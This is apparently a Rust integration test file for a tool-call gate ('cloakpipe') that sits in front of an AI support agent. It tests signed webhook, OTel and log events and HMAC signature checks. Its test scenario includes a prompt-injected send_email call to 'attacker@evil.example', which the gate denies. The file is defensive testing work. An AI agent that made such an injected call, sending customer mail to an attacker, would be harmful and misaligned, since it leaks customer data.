//! Event delivery from the command line: `mcp-proxy --events-log`,
//! `--webhook` (with `--webhook-secret-file`, `--webhook-format`),
//! `--otel-endpoint` / `--otel`, and `cloakpipe events test |
//! verify-signature`, against local receivers (127.0.0.1:0).

#[path = "../../cloakpipe-mcp/tests/support/receiver.rs"]
mod receiver;

use receiver::{black_hole, closed_port, Receiver};
use serde_json::{json, Value};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::Duration;

const WAIT: Duration = Duration::from_secs(10);
const SECRET: &str = "whsec-cli-test-secret";

/// The argument values of Example 2's calls: none may leave the gate.
const VALUES: &[&str] = &["attacker@evil.example", "dana@customer.example", "Hi Dana", "Your refund"];

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_cloakpipe"))
}

fn example(name: &str) -> String {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../examples/support-agent").join(name).to_string_lossy().into_owned()
}

fn secret_file(dir: &Path) -> String {
    let p = dir.join("webhook.secret");
    std::fs::write(&p, format!("{SECRET}\n")).unwrap();
    p.to_string_lossy().into_owned()
}

fn tool_call(id: u64, tool: &str, arguments: Value) -> String {
    json!({"jsonrpc": "2.0", "id": id, "method": "tools/call", "params": {"name": tool, "arguments": arguments}}).to_string()
}

fn email(to: &str) -> Value {
    json!({"ticket_id": "T-1042", "to": to, "subject": "Your refund", "body": "Hi Dana, your refund for T-1042 is on its way."})
}

/// Example 2: read the ticket, mail the customer, then the injected mail.
fn example_2() -> Vec<String> {
    vec![
        tool_call(1, "read_ticket", json!({"ticket_id": "T-1042"})),
        tool_call(2, "send_email", email("dana@customer.example")),
        tool_call(3, "send_email", email("attacker@evil.example")),
    ]
}

/// Run `mcp-proxy` on the support-agent example with `extra` flags; returns
/// (exit code, agent messages, stderr).
fn example_proxy(dir: &Path, extra: &[String], envs: &[(&str, &str)], lines: &[String]) -> (i32, Vec<Value>, String) {
    let upstream = format!("python3 {}", example("mock_upstream.py"));
    let mut cmd = bin();
    cmd.current_dir(dir)
        .args(["mcp-proxy", "--upstream", &upstream])
        .args(["--manifest", &example("cloakpipe.manifest.yaml")])
        .args(["--task-context", &example("task-context.json")])
        .args(["--operations-db", &dir.join("ops.db").to_string_lossy()])
        .args(extra)
        .env("MOCK_UPSTREAM_LOG", dir.join("upstream.jsonl"))
        .env("CLOAKPIPE_HOME", dir.join("home"))
        .env_remove("CLOAKPIPE_STATE_DB")
        .env_remove("CLOAKPIPE_SIGNING_KEY")
        .env_remove("CLOAKPIPE_RELEASE")
        .env_remove("CLOAKPIPE_TASK_CONTEXT")
        .env_remove("CLOAKPIPE_OPERATIONS_DB")
        .env_remove("CLOAKPIPE_LEDGER_DB")
        .env_remove("OTEL_EXPORTER_OTLP_ENDPOINT");
    for (k, v) in envs {
        cmd.env(k, v);
    }
    let mut child = cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
    child.stdin.take().unwrap().write_all(lines.iter().map(|l| format!("{l}\n")).collect::<String>().as_bytes()).unwrap();
    let out = child.wait_with_output().unwrap();
    let msgs = String::from_utf8_lossy(&out.stdout).lines().filter_map(|l| serde_json::from_str(l).ok()).collect();
    (out.status.code().unwrap_or(-1), msgs, String::from_utf8_lossy(&out.stderr).into_owned())
}

fn cli(dir: &Path, args: &[&str]) -> (i32, String, String) {
    let out = bin().current_dir(dir).args(args).env_remove("OTEL_EXPORTER_OTLP_ENDPOINT").output().unwrap();
    (out.status.code().unwrap_or(-1), String::from_utf8_lossy(&out.stdout).into_owned(), String::from_utf8_lossy(&out.stderr).into_owned())
}

fn strings(v: &[&str]) -> Vec<String> {
    v.iter().map(|s| s.to_string()).collect()
}

fn assert_no_values(text: &str) {
    for v in VALUES {
        assert!(!text.contains(v), "{v:?} leaked: {text}");
    }
}

#[test]
fn example_2_sends_one_signed_deny_to_the_webhook_and_the_log() {
    let dir = tempfile::tempdir().unwrap();
    let rx = Receiver::start(&[]);
    let log = dir.path().join("events.jsonl");
    let extra = strings(&[
        "--webhook", &rx.url("/hook"),
        "--webhook-secret-file", &secret_file(dir.path()),
        "--events-log", &log.to_string_lossy(),
    ]);
    let (code, msgs, err) = example_proxy(dir.path(), &extra, &[], &example_2());
    assert_eq!(code, 0, "{err}");
    let denied = msgs.iter().find(|m| m["id"] == 3).expect("the injected mail is answered");
    assert_eq!(denied["error"]["data"]["reason"], "scope_mismatch", "{denied}");

    // The log: exactly one event, the deny, bound to its ledger entry.
    let text = std::fs::read_to_string(&log).unwrap();
    assert_no_values(&text);
    let events: Vec<Value> = text.lines().map(|l| serde_json::from_str(l).unwrap()).collect();
    assert_eq!(events.len(), 1, "{events:?}");
    let e = &events[0];
    assert_eq!(e["schema"], "cloakpipe.event/v1");
    assert_eq!(e["kind"], "decision.deny");
    assert_eq!(e["reason"], "scope_mismatch");
    assert_eq!(e["path"], "/to");
    assert_eq!(e["tool"], "send_email");
    assert_eq!(e["release"], "support-agent");
    assert_eq!(e["mode"], "enforce");
    assert!(e["ledger_seq"].is_u64() && e["fingerprint"].as_str().unwrap().starts_with("sha256:"), "{e}");

    // The webhook: the same event, signed.
    let got = rx.wait_for(1, WAIT);
    assert_eq!(got.len(), 1, "{got:?}");
    let req = &got[0];
    assert_eq!(&req.json(), e);
    assert_eq!(req.header("cloakpipe-event"), Some("decision.deny"));
    assert_eq!(req.header("cloakpipe-fingerprint"), e["fingerprint"].as_str());
    assert_no_values(&req.text());

    // A receiver checks it with `events verify-signature`.
    let body = dir.path().join("body.json");
    std::fs::write(&body, &req.body).unwrap();
    let header = req.header("cloakpipe-signature").expect("signed").to_string();
    let secret = secret_file(dir.path());
    let verify = |body: &Path, header: &str| {
        cli(dir.path(), &["events", "verify-signature", "--secret-file", &secret, "--header", header, "--body-file", &body.to_string_lossy()])
    };
    let (code, out, err) = verify(&body, &header);
    assert_eq!(code, 0, "{out}{err}");
    assert!(out.contains("signature ok"), "{out}");
    let tampered = dir.path().join("tampered.json");
    std::fs::write(&tampered, String::from_utf8_lossy(&req.body).replace("scope_mismatch", "ok")).unwrap();
    let (code, _, err) = verify(&tampered, &header);
    assert_eq!(code, 1, "{err}");
    assert!(err.contains("does not match"), "{err}");
}

#[test]
fn every_decision_is_a_span_at_the_otel_endpoint() {
    let dir = tempfile::tempdir().unwrap();
    let rx = Receiver::start(&[]);
    let (code, _, err) = example_proxy(dir.path(), &strings(&["--otel-endpoint", &rx.base]), &[], &example_2());
    assert_eq!(code, 0, "{err}");
    let got = rx.wait_for(1, WAIT);
    let mut decisions = Vec::new();
    for req in &got {
        assert_eq!(req.path, "/v1/traces");
        assert_no_values(&req.text());
        for span in req.json()["resourceSpans"][0]["scopeSpans"][0]["spans"].as_array().unwrap() {
            assert_eq!(span["name"], "cloakpipe.decision");
            let attr = |k: &str| {
                span["attributes"].as_array().unwrap().iter().find(|a| a["key"] == k).map(|a| a["value"]["stringValue"].clone())
            };
            decisions.push((attr("cloakpipe.tool").unwrap(), attr("cloakpipe.decision").unwrap()));
        }
    }
    assert_eq!(
        decisions,
        [(json!("read_ticket"), json!("allow")), (json!("send_email"), json!("allow")), (json!("send_email"), json!("deny"))],
        "allows are spans too"
    );
}

#[test]
fn otel_reads_the_standard_endpoint_variable_only_when_asked() {
    let dir = tempfile::tempdir().unwrap();
    let rx = Receiver::start(&[]);
    let calls = &example_2()[..1];
    // Set, but without --otel: nothing is exported.
    let (code, _, err) = example_proxy(dir.path(), &[], &[("OTEL_EXPORTER_OTLP_ENDPOINT", &rx.base)], calls);
    assert_eq!(code, 0, "{err}");
    std::thread::sleep(Duration::from_millis(300));
    assert!(rx.requests().is_empty(), "the variable alone exports nothing");
    // --otel: it is the endpoint.
    let (code, _, err) = example_proxy(dir.path(), &strings(&["--otel"]), &[("OTEL_EXPORTER_OTLP_ENDPOINT", &rx.base)], calls);
    assert_eq!(code, 0, "{err}");
    assert!(!rx.wait_for(1, WAIT).is_empty());
    // --otel without the variable is a usage error.
    let (code, _, err) = example_proxy(dir.path(), &strings(&["--otel"]), &[], calls);
    assert_eq!(code, 2, "{err}");
    assert!(err.contains("OTEL_EXPORTER_OTLP_ENDPOINT"), "{err}");
}

#[test]
fn events_test_sends_a_sample_in_the_chosen_format() {
    let dir = tempfile::tempdir().unwrap();
    let rx = Receiver::start(&[]);
    let secret = secret_file(dir.path());
    let (code, out, err) = cli(
        dir.path(),
        &["events", "test", "--webhook", &rx.url("/slack"), "--webhook-secret-file", &secret, "--webhook-format", "slack"],
    );
    assert_eq!(code, 0, "{out}{err}");
    assert!(out.contains("delivered"), "{out}");
    let got = rx.wait_for(1, WAIT);
    assert_eq!(got.len(), 1);
    let v = got[0].json();
    assert_eq!(v["blocks"][0]["type"], "header", "{v}");
    assert!(v["blocks"][0]["text"]["text"].as_str().unwrap().starts_with("Tool call denied"), "{v}");
    let body = dir.path().join("body.json");
    std::fs::write(&body, &got[0].body).unwrap();
    let header = got[0].header("cloakpipe-signature").unwrap().to_string();
    let (code, _, err) =
        cli(dir.path(), &["events", "verify-signature", "--secret-file", &secret, "--header", &header, "--body-file", &body.to_string_lossy()]);
    assert_eq!(code, 0, "{err}");

    // Nothing listening: reported, exit 1.
    let (code, _, err) = cli(dir.path(), &["events", "test", "--webhook", &format!("{}/x", closed_port())]);
    assert_eq!(code, 1, "{err}");
    assert!(err.contains("not delivered"), "{err}");
}

#[test]
fn verify_signature_rejects_a_stale_timestamp_unless_told_not_to() {
    let dir = tempfile::tempdir().unwrap();
    let secret = secret_file(dir.path());
    let body = dir.path().join("body.json");
    std::fs::write(&body, br#"{"kind":"decision.deny"}"#).unwrap();
    // v1 = hex(HMAC-SHA256(secret, "1000000000.<body>")), computed independently.
    let v1 = {
        use sha2::{Digest, Sha256};
        // HMAC by hand (RFC 2104) with a 64-byte block.
        let mut key = [0u8; 64];
        key[..SECRET.len()].copy_from_slice(SECRET.as_bytes());
        let pad = |b: u8| key.iter().map(|k| k ^ b).collect::<Vec<u8>>();
        let inner = Sha256::new().chain_update(pad(0x36)).chain_update(b"1000000000.").chain_update(br#"{"kind":"decision.deny"}"#).finalize();
        hex::encode(Sha256::new().chain_update(pad(0x5c)).chain_update(inner).finalize())
    };
    let header = format!("t=1000000000,v1={v1}");
    let body = body.to_string_lossy().into_owned();
    let run = |extra: &[&str]| {
        let mut a = vec!["events", "verify-signature", "--secret-file", &secret, "--header", &header, "--body-file", &body];
        a.extend_from_slice(extra);
        cli(dir.path(), &a)
    };
    let (code, _, err) = run(&[]);
    assert_eq!(code, 1, "2001 is long past the default 300 s tolerance: {err}");
    assert!(err.contains("tolerance"), "{err}");
    let (code, out, err) = run(&["--tolerance", "0"]);
    assert_eq!(code, 0, "--tolerance 0 skips the age check: {out}{err}");
}

#[test]
fn event_flags_are_checked_before_anything_starts() {
    let dir = tempfile::tempdir().unwrap();
    let secret = secret_file(dir.path());
    let cases: Vec<(Vec<String>, &str)> = vec![
        (strings(&["--webhook-secret-file", &secret]), "--webhook"),
        (strings(&["--webhook-format", "slack"]), "--webhook"),
        (strings(&["--webhook", "ftp://example.invalid/hook"]), "http"),
        (strings(&["--webhook", "http://127.0.0.1:9/x", "--webhook-secret-file", &dir.path().join("none").to_string_lossy()]), "cannot read"),
        (strings(&["--events-log", &dir.path().join("no/such/dir/events.jsonl").to_string_lossy()]), "--events-log"),
        (strings(&["--otel-endpoint", "localhost:4318"]), "http"),
    ];
    for (extra, needle) in cases {
        let (code, msgs, err) = example_proxy(dir.path(), &extra, &[], &example_2()[..1]);
        assert_eq!(code, 2, "{extra:?}: {err}");
        assert!(msgs.is_empty(), "{extra:?}: nothing ran");
        assert!(err.contains(needle), "{extra:?}: {err}");
    }
    let empty = dir.path().join("empty.secret");
    std::fs::write(&empty, "\n").unwrap();
    let (code, _, err) = example_proxy(dir.path(), &strings(&["--webhook", "http://127.0.0.1:9/x", "--webhook-secret-file", &empty.to_string_lossy()]), &[], &[]);
    assert_eq!(code, 2, "an empty secret: {err}");

    // Without --manifest there is no gate and so no events.
    let out = bin()
        .current_dir(dir.path())
        .args(["mcp-proxy", "--upstream", "true", "--events-log", "events.jsonl"])
        .env("CLOAKPIPE_HOME", dir.path().join("home"))
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("--manifest"));
}

#[test]
fn a_failed_anchor_is_an_anchor_failed_event() {
    let dir = tempfile::tempdir().unwrap();
    let log = dir.path().join("events.jsonl");
    // A TSA nothing listens on: every epoch's timestamp fails.
    let tsa = format!("{}/tsr", closed_port());
    let extra = strings(&["--anchor-every", "1", "--tsa", &tsa, "--no-rekor", "--events-log", &log.to_string_lossy()]);
    let (code, _, err) = example_proxy(dir.path(), &extra, &[], &example_2()[..1]);
    assert_eq!(code, 0, "{err}");
    let events: Vec<Value> = std::fs::read_to_string(&log).unwrap().lines().map(|l| serde_json::from_str(l).unwrap()).collect();
    let failed: Vec<&Value> = events.iter().filter(|e| e["kind"] == "anchor.failed").collect();
    assert!(!failed.is_empty(), "{events:?}\n{err}");
    let e = failed[0];
    assert_eq!(e["reason"], "rfc3161", "{e}");
    assert_eq!(e["release"], "support-agent", "{e}");
    assert!(e["ledger_seq"].is_u64(), "the epoch's last entry: {e}");
    assert!(e["fingerprint"].as_str().unwrap().starts_with("sha256:"), "{e}");
}

#[test]
fn a_stdio_gate_waits_for_a_hung_webhook_once_on_exit() {
    // A receiver that accepts and never answers: every delivery hangs.
    let url = format!("{}/hook", black_hole());
    let dir = tempfile::tempdir().unwrap();
    let started = std::time::Instant::now();
    let (code, msgs, err) = example_proxy(dir.path(), &strings(&["--webhook", &url]), &[], &example_2());
    let took = started.elapsed();
    assert_eq!(code, 0, "{err}");
    assert_eq!(msgs.len(), 3, "decisions are not held up: {msgs:?}");
    // One flush of at most EVENT_FLUSH (5 s), not one per layer.
    assert_eq!(err.matches("still delivering").count(), 1, "{err}");
    assert!(took < Duration::from_secs(9), "exit took {took:?}: {err}");
}

#[test]
fn a_stdio_gate_in_front_of_an_http_upstream_delivers_its_events_before_exit() {
    // Two failures first: the deny is delivered on the third try, ~1.5 s in.
    let rx = Receiver::start(&[500, 500]);
    let dir = tempfile::tempdir().unwrap();
    let extra = strings(&["--upstream-url", &format!("{}/mcp", closed_port()), "--webhook", &rx.url("/hook")]);
    let mut cmd = bin();
    cmd.current_dir(dir.path())
        .args(["mcp-proxy", "--manifest", &example("cloakpipe.manifest.yaml")])
        .args(["--task-context", &example("task-context.json")])
        .args(["--operations-db", &dir.path().join("ops.db").to_string_lossy()])
        .args(&extra)
        .env("CLOAKPIPE_HOME", dir.path().join("home"))
        .env_remove("CLOAKPIPE_STATE_DB")
        .env_remove("CLOAKPIPE_SIGNING_KEY")
        .env_remove("CLOAKPIPE_RELEASE")
        .env_remove("CLOAKPIPE_TASK_CONTEXT")
        .env_remove("CLOAKPIPE_OPERATIONS_DB")
        .env_remove("CLOAKPIPE_LEDGER_DB");
    let mut child = cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
    let injected = tool_call(3, "send_email", email("attacker@evil.example"));
    child.stdin.take().unwrap().write_all(format!("{injected}\n").as_bytes()).unwrap();
    let out = child.wait_with_output().unwrap();
    let err = String::from_utf8_lossy(&out.stderr);
    assert_eq!(out.status.code(), Some(0), "{err}");
    assert!(String::from_utf8_lossy(&out.stdout).contains("scope_mismatch"), "{err}");
    // Delivered before the gate exited: nothing arrives after it.
    let got = rx.requests();
    assert_eq!(got.len(), 3, "the third try was delivered before exit: {got:?}\n{err}");
    assert_eq!(got[2].header("cloakpipe-event"), Some("decision.deny"));
}
